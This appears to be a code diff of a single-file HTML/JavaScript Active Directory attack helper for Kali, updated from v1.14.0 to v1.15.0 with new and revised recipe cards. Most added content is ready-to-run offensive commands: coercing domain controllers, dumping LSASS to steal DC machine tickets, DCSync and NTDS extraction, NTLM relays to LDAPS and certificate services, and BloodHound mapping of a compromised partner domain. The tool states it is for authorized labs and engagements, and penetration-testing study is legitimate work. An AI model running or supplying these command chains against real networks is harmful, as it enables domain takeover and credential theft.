@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.14.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.15.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -221,7 +221,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.14.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.15.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -276,7 +276,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.14.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.15.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -326,6 +326,7 @@ const VAR_DEFS = [
   {k:'dc_ip',       label:'DC IP',         ph:'172.16.6.100',              grp:'Domain / DC', color:'v-ip', req:1, tip:'IP of the DC from recon or the challenge scope'},
   {k:'dc_dn',       label:'DC DN',         ph:'CN=PROD-DC,OU=DOMAIN CONTROLLERS,DC=ARGON,DC=HTB', grp:'Domain / DC', color:'v-host', tip:'distinguishedName of the DC: <span class="mono">bloodyad get object "DC01$" --attr distinguishedName</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt;</span>'},
   {k:'trust_domain',label:'Trust domain', ph:'htb.local',                 grp:'Domain / DC', color:'v-domain', tip:'FQDN of the partner domain: <span class="mono">bloodyad get trusts</span> / <span class="mono">nxc ldap --dc-list</span> / Windows: <span class="mono">nltest /domain_trusts</span>'},
+  {k:'trust_realm', label:'Trust realm',   ph:'HTB.LOCAL',                 grp:'Domain / DC', color:'v-domain', derive:s=>(s.trust_domain||'').toUpperCase(), src:['trust_domain'], hint:'trust_domain → UPPERCASE'},
   {k:'trust_dc_ip', label:'Trust DC IP',  ph:'172.16.6.200',              grp:'Domain / DC', color:'v-ip', tip:'IP of the trusted domain DC (trust-enum recipe: <span class="mono">--dc-list</span>, DNS, or given)'},
   {k:'trust_netbios',label:'Trust NetBIOS',ph:'HTB',                      grp:'Domain / DC', color:'v-domain', tip:'NetBIOS (flatName) of the partner: <span class="mono">nxc ldap &lt;dc&gt; -u .. -p .. --dc-list</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt; ... (objectClass=trustedDomain) flatName</span>'},
   {k:'target_host', label:'Target host',   ph:'prod-sql',                  grp:'Target', color:'v-host', req:1, tip:'short hostname of the machine you attack next (recon / BloodHound sessions)'},
@@ -342,6 +343,8 @@ const VAR_DEFS = [
   {k:'ccache',      label:'ccache path',   ph:'/home/kali/Administrator.ccache', grp:'Access', color:'v-file', tip:'path printed by getTGT / getST / ticketer, or <span class="mono">impacket-ticketConverter</span> output'},
   {k:'krbtgt_hash', label:'krbtgt / key',  ph:'ntlm or aes of krbtgt',     grp:'Access', color:'v-hash', tip:'<span class="mono">impacket-secretsdump -just-dc-user krbtgt "domain/user@dc"</span>'},
   {k:'trust_key',   label:'Trust key',     ph:'NT hash of <trust_netbios>$',grp:'Access', color:'v-hash', tip:'NT hash of the partner trust account: <span class="mono">secretsdump -just-dc-user "&lt;trust_netbios&gt;$"</span>. Only RC4/NT works for forging (AES derivations cannot request a TGT).'},
+  {k:'trust_user',  label:'2nd domain user',ph:'it.user',                 grp:'Access', color:'v-user', tip:'your foothold account in the second/partner domain (e.g. the IT group user)'},
+  {k:'trust_pass',  label:'2nd domain pass',ph:'…',                       grp:'Access', color:'v-secret', tip:'password of the second-domain account'},
   {k:'domain_sid',  label:'Own domain SID',ph:'S-1-5-21-…',                grp:'Access', color:'v-sid', tip:'<span class="mono">nxc ldap &lt;dc&gt; -u .. -p .. --get-sid</span> / <span class="mono">impacket-lookupsid</span> / <span class="mono">bloodyad get object "&lt;domain_dn&gt;" --attr objectSid</span>'},
   {k:'trust_domain_sid',label:'Trust SID', ph:'S-1-5-21-…',                grp:'Access', color:'v-sid', tip:'<span class="mono">--get-sid</span> against the trusted DC, or BloodHound query "Domain SIDs" (<span class="mono">d.objectid</span>)'},
   {k:'extra_sid',   label:'Extra SID',     ph:'S-1-5-21-…-519',            grp:'Access', color:'v-sid', tip:'target domain SID + <span class="mono">-519</span> (Enterprise Admins) — see trust-sid-history; BloodHound "Domain SIDs"'},
@@ -1162,7 +1165,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.14.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.15.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -1867,13 +1870,16 @@ cmds:[
 R({id:'unconstrained-coerce',cat:'deleg',title:'Unconstrained delegation + coercion',desc:'A machine trusted for delegation caches TGTs of users who authenticate to it. Coerce a DC and collect them.',
 cmds:[
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'find unconstrained hosts'],
- [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{dc_ip}}`,'coerce DC via print spooler'],
- [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{dc_ip}}`,'coerce via EFSRPC'],
- [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}}`,'mass coercion (all vectors)'],
- [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M lsassy`,'dump cached TGTs from LSASS'],
- [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'full LSASS dump path'],
- [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'LSASS dump via ccache']
-],note:'Classic chain: you have admin on an unconstrained host → coerce <span class="mono">{{dc_host}}</span> to authenticate to that host → DC machine TGT lands in LSASS → dump it → DCSync. Check spooler first: <span class="mono">nxc smb {{target_host}} -M printnightmare</span> / <span class="mono">rpcclient -c \'getprinter\'</span>. On Kali, nxc <span class="mono">-M lsassy</span> or <span class="mono">-M nanodump</span> reads LSASS without Mimikatz.'});
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{target_ip}}`,'coerce the DC → unconstrained host (LISTENER = its IP)'],
+ [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{dc_host}}' {{target_ip}}`,'spooler (MS-RPRN) → uncon host'],
+ [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{dc_host}}' {{target_ip}}`,'EFSRPC → uncon host'],
+ [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{dc_host}} -l {{target_ip}}`,'all vectors → uncon host'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M lsassy -o DUMP_TICKETS=true SAVE_TYPE=ccache`,'dump LSASS — DC$ TGT saved as ccache in ~/.nxc/modules/lsassy/'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth -M lsassy -o DUMP_TICKETS=true SAVE_TYPE=ccache`,'local account on the host variant'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M nanodump`,'alternative: raw minidump (parse with pypykatz)'],
+ [`KRB5CCNAME=~/.nxc/modules/lsassy/{{dc_host}}$.ccache impacket-secretsdump -k -no-pass -just-dc '{{domain}}/{{dc_host}}$@{{dc_fqdn}}'`,'DCSync as the DC machine account (replication rights)'],
+ [`KRB5CCNAME=~/.nxc/modules/lsassy/{{dc_host}}$.ccache nxc smb {{dc_host}} -u '{{dc_host}}$' -k --use-kcache --ntds`,'or dump NTDS with the stolen TGT']
+],note:'Classic chain: you have admin on an unconstrained host → coerce <span class="mono">{{dc_host}}</span> to authenticate <b>to that host</b> (LISTENER = the delegation host IP, <b>not</b> your Kali) → the DC machine TGT lands in its LSASS → dump it → DCSync. <span class="mono">-M lsassy</span> saves tickets per default (<span class="mono">DUMP_TICKETS=true</span>) as <b>ccache</b> in <span class="mono">~/.nxc/modules/lsassy/</span>; <span class="mono">-M nanodump</span> gives a raw minidump for <span class="mono">pypykatz lsa minidump &lt;dump&gt;</span>. Add <span class="mono">--local-auth</span> when you only hold a local account on the delegation host. <span class="mono">coerce_plus</span> only triggers the authentication — it never prints a ticket itself. Coercing to Kali requires a running listener (Responder/ntlmrelayx), and DC machine hashes cannot be cracked (120 random chars), so capture-only is pointless. Check the spooler first: <span class="mono">nxc smb {{target_host}} -M printnightmare</span> / <span class="mono">rpcclient -c \'getprinter\'</span>.'});
 
 /* ===== ADCS / CERTIPY ===== */
 R({id:'adcs-find',cat:'adcs',title:'ADCS — enumerate CAs and templates',desc:'Certipy 5.x: find vulnerable templates and CA configuration.',
@@ -2248,7 +2254,7 @@ cmds:[
  [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'spooler (MS-RPRN)'],
  [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'EFSRPC'],
  [`impacket-dfscoerce '{{domain}}/{{user}}:{{password}}@{{target_host}}' '{{domain}}/{{dc_host}}'`,'DFS coerce']
-],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.<br>Across a domain trust the target is <span class="mono">{{trust_dc_ip}}</span> — see the Cross-trust coercion & relay card.'});
+],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.<br><b>LISTENER decides where the authentication goes:</b> your Kali = a capture/relay listener must already run (<span class="mono">responder -wPv</span> or <span class="mono">ntlmrelayx</span>; DC machine hashes are uncrackable, so only relaying helps); an unconstrained-delegation host = the DC$ TGT lands in its LSASS — dump it there (<span class="mono">-M lsassy</span>). Coercion alone never prints a ticket.<br>Across a domain trust the target is <span class="mono">{{trust_dc_ip}}</span> — see the Cross-trust coercion & relay card.'});
 
 R({id:'mitm6',cat:'relay',title:'mitm6 — IPv6 DNS takeover + relay',desc:'When LLMNR/NBT-NS are quiet: take over DNS via DHCPv6 and relay the authentication that follows.',
 cmds:[
@@ -2644,12 +2650,25 @@ cmds:[
  [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}' {{attacker_ip}}`,'EFSRPC'],
  [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}' '\\\\{{attacker_ip}}@80\\a'`,'WebDAV listener — HTTP-sourced auth for LDAP/ADCS relay'],
  [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{trust_dc_ip}} -l {{attacker_ip}}`,'try every coercion vector'],
- [`impacket-ntlmrelayx -t ldaps://{{trust_dc_ip}} -smb2support --escalate-user '{{target_user}}'`,'relay to partner LDAPS → DCSync rights for a partner account','n'],
+ [`sudo responder -I {{iface}} -wPv`,'capture-only (no relay) — start this BEFORE coercing','ns'],
+ [`impacket-ntlmrelayx -t ldaps://{{trust_dc_ip}} -smb2support --escalate-user '{{target_user}}'`,'START FIRST: relay to partner LDAPS → DCSync rights for a partner account','n'],
  [`impacket-ntlmrelayx -t ldaps://{{trust_dc_ip}} --delegate-access -smb2support`,'or RBCD on a partner machine','n'],
  [`impacket-ntlmrelayx -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`,'ESC8: partner CA issues a DC certificate','n'],
  [`certipy relay -target 'rpc://{{ca_host}}' -ca '{{ca}}' -template DomainController`,'ESC11: relay into the partner CA RPC','n'],
  [`nxc smb {{trust_dc_ip}} -d {{domain}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{target_host}}`,'unconstrained cross-domain: coerce partner DC to a host of YOUR domain']
-],note:'The coerced identity is the <b>partner DC machine account</b> — it is validated by its own domain, so relay it to services in the partner domain (<span class="mono">{{trust_dc_ip}}</span>): LDAP(S) for ACL/RBCD abuse, ADCS for a DC certificate. Credentials you fire the coercion with belong to your domain (<span class="mono">-d {{domain}}</span>).<br>Checks before you start: <span class="mono">nxc ldap {{trust_dc_ip}} -u … -M ldap-checker</span> (signing/channel binding; <b>Server 2025 enables EPA by default</b> for LDAP and ADCS), and the trust direction from trust-enum — the partner (resource domain) must trust your domain for pass-through. <b>Selective authentication</b> blocks cross-domain resource access without "Allowed to Authenticate"; NTLM restrictions can break pass-through entirely.<br><b>Protocol detail:</b> SMB-sourced NTLM carries signing flags and is often refused by LDAP/ADCS HTTP — use the WebDAV listener (<span class="mono">\\\\{{attacker_ip}}@80\\a</span>) so the auth arrives over HTTP. Need admin on an unconstrained-delegation host in your own domain? Coerce the partner DC into it (intra-forest trusts allow machine auth across), dump LSASS and DCSync the partner — no relay needed. DC machine passwords are 120 random chars: cracking is pointless, relay or steal the TGT.'});
+],note:'<b>Coercion only triggers the authentication — the listener must already be running.</b> Start <span class="mono">ntlmrelayx</span> (or <span class="mono">responder -wPv</span> for capture) first, then fire a coercion command. The coerced identity is the <b>partner DC machine account</b> — it is validated by its own domain, so relay it to services in the partner domain (<span class="mono">{{trust_dc_ip}}</span>): LDAP(S) for ACL/RBCD abuse, ADCS for a DC certificate. Credentials you fire the coercion with belong to your domain (<span class="mono">-d {{domain}}</span>).<br>Checks before you start: <span class="mono">nxc ldap {{trust_dc_ip}} -u … -M ldap-checker</span> (signing/channel binding; <b>Server 2025 enables EPA by default</b> for LDAP and ADCS), and the trust direction from trust-enum — the partner (resource domain) must trust your domain for pass-through. <b>Selective authentication</b> blocks cross-domain resource access without "Allowed to Authenticate"; NTLM restrictions can break pass-through entirely.<br><b>Protocol detail:</b> SMB-sourced NTLM carries signing flags and is often refused by LDAP/ADCS HTTP — use the WebDAV listener (<span class="mono">\\\\{{attacker_ip}}@80\\a</span>) so the auth arrives over HTTP. Need admin on an unconstrained-delegation host in your own domain? Coerce the partner DC into it (intra-forest trusts allow machine auth across), dump LSASS and DCSync the partner — no relay needed. DC machine passwords are 120 random chars: cracking is pointless, relay or steal the TGT.'});
+
+R({id:'second-domain',cat:'trust',title:'Second domain foothold — collect, map, mark',desc:'You now have an account in the partner domain (for example a member of the IT group): ingest its data, flatten your group and mark what you own.',
+cmds:[
+ [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' --bloodhound -c All --dns-server {{trust_dc_ip}}`,'collect the partner domain (CE collector)'],
+ [`bloodhound-python -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' -ns {{trust_dc_ip}} -c All`,'or Python collector','n'],
+ [`bhcli upload *.zip`,'ingest into BloodHound CE'],
+ [`bhcli domains --sid`,'confirm both domains and their SIDs'],
+ [`nxc ldap {{trust_dc_ip}} -d {{trust_domain}} -u '{{trust_user}}' -p '{{trust_pass}}' --groups`,'quick LDAP look at the partner groups'],
+ [`bhcli members --indirect 'IT@{{trust_realm}}'`,'flatten the group you are in (replace IT)'],
+ [`bhcli mark Owned '{{trust_user}}@{{trust_realm}}'`,'mark your partner-domain foothold'],
+ [`bhcli audit -d {{trust_domain}}`,'quick-win check in the partner domain']
+],note:'Order: collect → <span class="mono">bhcli upload</span> → mark → query. Point the collector at the partner DC for DNS (<span class="mono">-ns</span>/<span class="mono">--dns-server</span>) or add it to <span class="mono">/etc/hosts</span>. BloodHound group labels are uppercase <span class="mono">GROUP@REALM</span> — use <span class="mono">{{trust_realm}}</span>. Then find the group rights with the "What a group controls", "Sessions of group members" and "Local admin / remote access of group members" queries, and abuse them with the ACL recipes (bloodyAD, dacl-*). Marking the Domain node as Owned (CE GUI) plus your users/computers makes the owned→Domain Admins query span both domains.'});
 
 /* ===== BLOODHOUND COLLECTION ===== */
 R({id:'bh-python',cat:'bh',title:'bloodhound-python collection',desc:'Collect from Linux — all the data needed for pathfinding.',
@@ -2730,7 +2749,7 @@ steps:[
 need:['user'], needAny:['password','nthash','ccache'],
 steps:[
  {t:'Confirm the host',d:'Unconstrained computers cache TGTs of authenticating users.',r:['deleg-enum']},
- {t:'Coerce authentication',d:'Make the DC authenticate to the unconstrained host.',req:'local admin on the delegation host (or relay listener) + coercion vector',r:['relay-coerce']},
+ {t:'Coerce authentication',d:'Make the DC authenticate to the unconstrained host — LISTENER must be that host IP, not Kali.',req:'local admin on the delegation host + a coercion vector',r:['unconstrained-coerce','relay-coerce']},
  {t:'Steal the tickets',d:'Dump LSASS on the unconstrained host — DC machine TGT included.',r:['unconstrained-coerce','creds-sam-lsa']},
  {t:'DCSync',d:'With the DC machine account you can replicate secrets.',r:['creds-dcsync']}
 ]},
@@ -2792,6 +2811,16 @@ steps:[
  {t:'Hybrid identity',d:'AD Connect connector accounts (MSOL/ADSync) and AD FS Golden SAML bridge on-prem AD into Entra ID and federated apps.',r:['entra-connect','adfs-goldensaml']},
  {t:'Dump',d:'Once the parent DC accepts your ticket, DCSync it.',r:['creds-dcsync']}
 ]},
+{id:'second-domain',title:'I have a foothold in the second/partner domain',when:'A trust partner (second domain) gave you an account — for example you are a member of its IT group.', reqs:['a valid account in the partner domain + BloodHound CE reachable'],
+need:['trust_user'], needAny:['trust_pass'],
+steps:[
+ {t:'Collect & ingest the partner domain',d:'Run a collector against the partner DC, then upload and confirm both domains.',r:['second-domain']},
+ {t:'Mark what you own',d:'Tag partner-domain users/computers via bhcli; mark groups and the Domain node in the CE GUI.',r:['bhcli-mark-owned']},
+ {t:'Map your group',d:'Flatten nested memberships, audit the domain and check stats.',r:['bhcli-recon']},
+ {t:'What can the group do?',d:'Run the group queries (rights, sessions, local admin) and check writable objects.',r:['dacl-enum','bloodyad-writable']},
+ {t:'Abuse the rights',d:'ACL takeover, shadow credentials, RBCD or ADCS depending on the edges you found.',r:['dacl-genericall-user','dacl-genericall-computer','shadow-creds','adcs-find']},
+ {t:'Cross-domain follow-up',d:'If the partner path continues, check trusts and cross-trust coercion/relay.',r:['trust-enum','trust-coerce-relay']}
+]},
 {id:'gpo',title:'I can modify a GPO or ADIDNS',when:'GenericWrite/WriteDACL on a GPO object, or AD-integrated DNS is writable.', reqs:['write rights on a GPO or AD-integrated DNS'],
 need:['user'], needAny:['password','nthash','ccache'],
 steps:[
@@ -2839,6 +2868,17 @@ cmds:[
  [`bhcli audit -d {{domain}}`,'quick audit: ADCS, GenericWrite, roastables, unconstrained, old OS']
 ],note:'<span class="mono">audit</span> is the closest thing to a one-shot findings list; combine it with the Cypher queries for custom paths. Output is one object per line — ideal for piping into wordlists or spraying tools.'});
 
+R({id:'bhcli-mark-owned',cat:'bh',title:'bhcli — mark Owned / Tier Zero (pwned objects)',desc:'Tell BloodHound what you control: users and computers via bhcli, groups/Domains/OUs/GPOs via the CE GUI. Owned nodes are the start of every path query.',
+cmds:[
+ [`bhcli mark Owned '{{user}}@{{realm}}'`,'mark a user (name contains @)'],
+ [`bhcli mark Owned '{{target_host}}.{{domain}}'`,'mark a computer (no @)'],
+ [`printf '{{user}}@{{realm}}\\n{{target_host}}.{{domain}}\\n' | bhcli mark Owned --file -`,'bulk via stdin'],
+ [`bhcli users --domain {{domain}} --enabled | cut -f1 | bhcli mark Owned --file -`,'bulk: every enabled user (e.g. spray success lists)'],
+ [`bhcli computers --domain {{domain}} --sam | cut -f1 | bhcli mark Owned --file -`,'bulk: all computers of the domain'],
+ [`bhcli mark 'Tier Zero' --file tierzero.txt`,'tag crown jewels — Owned is for YOUR footholds'],
+ [`bhcli cypher 'MATCH (n {owned:true}) RETURN n.name, n.domain' | jq -r '.nodes[].properties.name'`,'verify what is marked']
+],note:'<span class="mono">bhcli mark</span> supports <b>users and computers only</b> — the tag name is followed by full BloodHound labels (<span class="mono">USER@REALM</span>, <span class="mono">HOST.DOMAIN.LOCAL</span>, realm UPPERCASE) or <span class="mono">--file</span> (one per line, <span class="mono">-</span> = stdin); it is idempotent. Mark <b>groups, OUs, GPOs, CAs/templates and Domain nodes</b> in the CE UI: right-click → <b>Mark as Owned</b> (CE 5.5+). Mark a Domain node after full compromise so <span class="mono">owned → …</span> paths start there. Keep the asset groups apart: <b>Owned</b> = what you pwned, <b>Tier Zero</b> = the crown jewels you are hunting (<span class="mono">bhcli mark \"Tier Zero\" …</span>). After marking, re-run the owned queries in the BloodHound tab.'});
+
 R({id:'bhcli-cypher',cat:'bh',title:'bhcli — run Cypher queries from the terminal',desc:'Run the queries from this page through the CE API and post-process the JSON with jq — no GUI needed.',
 cmds:[
  [`bhcli cypher 'MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames' | jq -c '.nodes[].properties | [.name, .serviceprincipalnames]'`,'kerberoastable users as flat JSON'],
@@ -2847,7 +2887,7 @@ cmds:[
  [`bhcli cypher 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name' | jq -c '.nodes[].properties.name'`,'unconstrained delegation hosts'],
  [`bhcli queries hackerman-bhcli-queries.json`,'import all queries from the export button below'],
  [`bhcli cypher "$(cat query.cypher)" | jq`,'run a query from a file']
-],note:'<span class="mono">cypher</span> prints JSON with <span class="mono">nodes</span>/<span class="mono">relationships</span> arrays — the jq snippets flatten them. Use the <b>bhcli</b> copy button on any query below to get the exact command, or import all 30 with the export button. Everything runs server-side against CE, so the PostgreSQL backend works too.'});
+],note:'<span class="mono">cypher</span> prints JSON with <span class="mono">nodes</span>/<span class="mono">relationships</span> arrays — the jq snippets flatten them. Use the <b>bhcli</b> copy button on any query below to get the exact command, or import all 42 with the export button. Everything runs server-side against CE, so the PostgreSQL backend works too.'});
 
 R({id:'bhcli-alternatives',cat:'bh',title:'BloodHound CLI alternatives',desc:'Other terminal clients for BloodHound/Neo4j and when to pick which.',
 cmds:[
@@ -2957,7 +2997,7 @@ const HELP_ATTACK = {
  'rbcd-read': 'RBCD (resource-based constrained delegation) lets the <b>target</b> decide who may impersonate users on it. If you can write msDS-AllowedToActOnBehalfOfOtherIdentity, point it at a machine you control and then use S4U2Proxy to become Administrator on that target.',
  'constrained-getst': 'Classic constrained delegation: the account may act as any user toward specific services (msDS-AllowedToDelegateTo). With protocol transition (T2A4D) no victim credentials are needed — S4U2Self + S4U2Proxy yields a ticket as Administrator.',
  'spn-hijack-deleg': 'If the delegated SPN does not exist, move it onto the DC. The KDC then issues your S4U2Proxy ticket encrypted for the DC machine account, and -altservice makes it usable against DC services — delegation abuse without a real service.',
- 'unconstrained-coerce': 'Hosts trusted for unconstrained delegation cache the TGT of every user that authenticates to them. Coerce a DC to authenticate and its TGT lands in LSASS — dump it and you are the DC.',
+ 'unconstrained-coerce': 'Hosts trusted for unconstrained delegation cache the TGT of every user that authenticates to them. Coerce a DC to authenticate <b>to that host</b> (LISTENER = its IP, not Kali), dump LSASS (<span class="mono">-M lsassy</span> saves the DC$ TGT as ccache) and DCSync as the machine account.',
  'asrep': 'Accounts without Kerberos pre-authentication accept AS-REQ without proving identity. The response is encrypted with the user password and can be cracked offline.',
  'kerberoast': 'Request a service ticket for any SPN. Part of the ticket is encrypted with the service account password hash — crack offline, no lockout, no interaction with the service itself.',
  'golden-ticket': 'Forge a TGT signed with the krbtgt key. It can assert any identity, group or SID (even across trusts) and survives normal password resets.',
@@ -3100,7 +3140,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v1.14.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v1.15.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
@@ -3193,9 +3233,9 @@ const REQS = {
   'mssql-connect':['mssql'], 'mssql-xpcmdshell':['mssql'], 'mssql-impersonate':['mssql'],
   'mssql-linked':['mssql'], 'mssql-coerce':['mssql','coercion'], 'mssql-alt-rce':['mssql'],
   'trust-enum':['creds'], 'trust-raisechild':['da'], 'trust-cross-domain-roast':['trustedcreds'],
-  'trust-sid-history':['trustkey','da'], 'trust-foreign-groups':['creds'], 'trust-coerce-relay':['creds','coercion'],
+  'trust-sid-history':['trustkey','da'], 'trust-foreign-groups':['creds'], 'trust-coerce-relay':['creds','coercion'], 'second-domain':['trustedcreds','bh'],
   'bh-python':['creds'], 'bh-nxc':['creds'],
-  'bhcli-setup':['shell','bh'], 'bhcli-recon':['bh'], 'bhcli-cypher':['bh'], 'bhcli-alternatives':['bh']
+  'bhcli-setup':['shell','bh'], 'bhcli-recon':['bh'], 'bhcli-mark-owned':['bh'], 'bhcli-cypher':['bh'], 'bhcli-alternatives':['bh']
 };
 const REQ_ISSUES = [];
 function reqSorted(reqs){ return (reqs || []).slice().sort((a, b) => (REQ_DEFS[b] ? REQ_DEFS[b].sev : 0) - (REQ_DEFS[a] ? REQ_DEFS[a].sev : 0)); }
@@ -3238,7 +3278,7 @@ CYPHER.push(
 {t:'GPOs you can write to',q:'MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p',n:'GPO write access = code execution on every machine in scope.'},
 {t:'ADCS certificate templates with edges',q:'MATCH p=(u:User)-[:Enroll|GenericAll|WriteOwner|WriteDacl|Owns]->(t:CertTemplate) RETURN p',n:'BloodHound CE only (ADCS collector enabled). Combine with certipy findings.'},
 {t:'All owned objects',q:'MATCH (n {owned:true}) RETURN n',n:'Quick sanity check of what BloodHound knows you control.'},
-{t:'Domain trusts',q:'MATCH p=(d:Domain)-[:TrustedBy]->(d2:Domain) RETURN p',n:'Find parent/child and forest trust relationships.'},
+{t:'Domain trusts (CE 7.4+ edges)',q:'MATCH p=(d:Domain)-[:SameForestTrust|CrossForestTrust|SpoofSIDHistory|AbuseTGTDelegation]-(d2:Domain) RETURN p',n:'BH CE ≥ 7.4 replaced <span class="mono">TrustedBy</span>: structural trusts (<span class="mono">SameForestTrust</span>/<span class="mono">CrossForestTrust</span>) plus the traversable <span class="mono">SpoofSIDHistory</span>/<span class="mono">AbuseTGTDelegation</span>. On older CE/legacy use <span class="mono">-[:TrustedBy]-</span>.'},
 {t:'Foreign group members (cross-domain)',q:'MATCH p=(u:User)-[:MemberOf*1..]->(g:Group) WHERE NOT g.name ENDS WITH "@{{realm}}" RETURN p',n:'Accounts from other domains nested in your groups — a common trust abuse path.'},
 {t:'Shortest path from owned to any high-value target',q:'MATCH p=shortestPath((n {owned:true})-[*1..]->(m)) WHERE m.highvalue = true RETURN p',n:'Broader than the Domain Admins query — covers DCs, CAs and tagged Tier-0 objects. In BloodHound CE tags live on <span class="mono">system_tags</span>: <span class="mono">MATCH (m) WHERE m.system_tags CONTAINS "admin_tier_0"</span>.'},
 {t:'DCSync / domain object write rights',q:'MATCH p=(u)-[:DCSync|GetChanges|GetChangesAll|GenericAll|WriteDacl|WriteOwner]->(d:Domain) RETURN p',n:'Anyone in this list can replicate secrets or rewrite the domain object — instant Domain Admin via DCSync.'},
@@ -3253,6 +3293,18 @@ CYPHER.push(
 {t:'RDP / DCOM access from owned',q:'MATCH p=(u {owned:true})-[:CanRDP|ExecuteDCOM]->(c:Computer) RETURN p',n:'Alternative execution paths next to CanPSRemote/AdminTo.'},
 {t:'ADCS CA permissions (ESC7)',q:'MATCH p=(u)-[:ManageCA|ManageCertificates|GenericAll|WriteDacl|WriteOwner]->(ca:EnterpriseCA) RETURN p',n:'Requires BloodHound CE ADCS collection. ManageCA/ManageCertificates rights enable the ESC7 path (see the certipy ca recipe).'},
 {t:'Domain SIDs (for extra-sid)',q:'MATCH (d:Domain) RETURN d.name, d.objectid',n:'Domain SIDs as <span class="mono">objectid</span> — add <span class="mono">-519</span> for Enterprise Admins (extra-sid) or use them for golden tickets.'},
+{t:'Owned principals per domain',q:'MATCH (n {owned:true}) RETURN n.name, n.domain ORDER BY n.domain',n:'Verify your footholds are tagged in both domains before running path queries.'},
+{t:'Owned → Tier Zero (CE tag + legacy)',q:'MATCH p=shortestPath((o {owned:true})-[*1..]->(t)) WHERE "admin_tier_0" IN coalesce(t.system_tags, []) OR coalesce(t.highvalue, false) RETURN p',n:'BloodHound CE tags Tier Zero objects in <span class="mono">system_tags</span>, legacy uses <span class="mono">highvalue</span> — both are covered.'},
